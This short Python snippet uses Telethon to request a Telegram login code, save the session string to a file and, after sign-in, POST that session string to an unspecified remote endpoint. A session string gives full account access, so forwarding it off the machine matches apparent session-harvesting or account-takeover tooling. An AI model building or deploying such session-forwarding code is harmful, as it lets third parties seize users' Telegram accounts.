from telethon import TelegramClient
import requests


async def send_request_phone(client: TelegramClient, phone: str):
    sent = await client.send_code_request(phone=phone)
    print(sent)
    with open('session.txt', 'w') as f:
        f.write(client.session.save())


async def send_sign_in(client: TelegramClient, phone: str, code: str):
    sent = await client.sign_in(phone=phone, code=code)
    print(sent)
    url = 'api url'
    requests.post(url, params={'session': client.session.save()})
